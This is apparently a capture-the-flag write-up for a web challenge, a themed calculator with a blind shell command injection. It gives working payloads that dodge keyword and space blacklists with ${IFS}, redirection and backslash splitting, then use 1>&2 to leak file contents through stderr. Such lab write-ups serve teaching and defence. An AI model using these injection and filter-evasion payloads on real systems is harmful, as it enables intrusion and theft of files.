# Official Writeup: Secure Calculator

**Category:** Web / Command Injection
**Difficulty:** Medium

## Challenge Description
The challenge presents a "Cyberpunk" themed calculator that accepts mathematical expressions. The goal is to read the `flag.txt` file.

---

## The Challenge

### 1. Reconnaissance
Upon opening the challenge, we see a simple input field asking for an expression.
Entering `1+1` returns `2`.
Entering `10*10` returns `100`.

This suggests the input is being evaluated. In Python web apps, this often points to `eval()` or `subprocess`.

### 2. Testing for Injection
Let's try to inject a shell command.
Input: `1; ls`
Output: `✅ CALCULATION PROCESSED. RESULT STORED IN SECURE MEMORY.`

Wait, it says "PROCESSED", but **we don't see the output!**
The application seems to be running the command but hiding the standard output (stdout).

### 3. Analyzing the Behavior
- `1` -> `✅ CALCULATION PROCESSED...`
- `invalid_command` -> `❌ SYSTEM ERROR...` (or similar error)

This confirms the command is running. If `stdout` is hidden, what about `stderr` (Standard Error)?
Let's try to generate an error that prints something we control.
Input: `1;ls_invalid_flag`
Output: `/bin/sh: 1: ls_invalid_flag: not found`

**We can see stderr!**

### 4. Bypassing Filters
Before we exploit this, we notice some inputs are blocked.
Input: `cat flag.txt`
Output: `🚫 ILLEGAL INPUT DETECTED. INCIDENT REPORTED.`

The blacklist seems to be: **Spaces**, **`cat`**, and **`flag`**.

#### Bypassing Space
In Linux, we can use Input Redirection (`<`) or the `${IFS}` variable to replace spaces.
- `ls -la` -> `ls${IFS}-la`
- `cat file` -> `cat<file`

#### Bypassing Keywords (`cat`, `flag`)
We can use backslashes to split keywords. The shell ignores them, but the application's string filter sees them as different words.
- `cat` -> `c\at`
- `flag` -> `fl\ag`

### 5. Exploitation (Error-Based Injection)
In Linux, we can redirect Standard Output (File Descriptor 1) to Standard Error (File Descriptor 2) using `1>&2`.

If we run `ls`, output goes to `stdout` (Hidden).
If we run `ls 1>&2`, output goes to `stderr` (Visible!).

### 6. Final Payload
We need to use our previous bypasses (for spaces and keywords) AND add the redirection.

**Payload:**
```bash
1;c\at<fl\ag.txt${IFS}1>&2;#
```

**Breakdown:**
1.  `c\at`: Bypass "cat" filter.
2.  `<`: Bypass space filter for input file.
3.  `fl\ag.txt`: Bypass "flag" filter.
4.  `${IFS}`: Bypass space filter (needed before `1>&2`).
5.  `1>&2`: **The Magic**. Redirects the flag content to stderr.
6.  `#`: Comment out the rest.

**Result:**
The flag is displayed in the error message box!
